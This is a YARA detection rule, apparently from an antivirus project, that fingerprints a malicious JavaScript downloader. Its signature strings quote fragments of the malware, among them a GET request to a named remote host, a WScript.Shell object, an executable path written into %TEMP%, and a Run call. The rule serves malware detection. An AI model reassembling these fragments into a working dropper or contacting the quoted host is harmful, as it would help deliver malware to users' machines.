rule sig_20160330_badd24adff8197b992ff0a438f4d48d4 {
  meta:
    description = "datamaliciousorder - file 20160330_badd24adff8197b992ff0a438f4d48d4.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "36cdc9d352b6683822826453741e5b7128bdfcc226d4c68c55f86dd804d4f65e"

  strings:
    $s1  = "K[NY](\"GET\", \"http://vidamparty.hu/as0ldr\", false);" fullword ascii
    $s2  = "var LD = function U() {return WScript[U0](\"WScript\"+\".Shell\");}(), QP = 11;" fullword ascii
    $s3  = "function VA(YD, UV){GI = GI * 1; return YD - UV;};" fullword ascii
    $s4  = "if (K[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function C() {return LD[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"8kK4wlHvJWf1.ex\" + \"e\";};" fullword ascii
    $s6  = "function J(){return RO + \"\";};" fullword ascii
    $s7  = "function X() {return ((IB == true) && (IB == AI)) ? 1 : GI;};" fullword ascii
    $s8  = "function N(WC){LD[\"Run\"](WC, GI, GI);};" fullword ascii
    $s9  = "var B = new this[\"Date\"]();" fullword ascii
    $s10 = "function RQ()" fullword ascii
    $s11 = "function JT(){return 22;};" fullword ascii
    $s12 = "}while (LX);" fullword ascii
    $s13 = "function W(BD) {var Y = (1, 2, 3, 4, 5, BD); return Y;};" fullword ascii
    $s14 = "function VT(){return U0;};" fullword ascii
    $s15 = "return VA(RS, QN);" fullword ascii
    $s16 = "AI = true; " fullword ascii
    $s17 = "var AI = false;" fullword ascii
    $s18 = "IB = true; " fullword ascii
    $s19 = "var IB = false;" fullword ascii
    $s20 = "var VJ = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}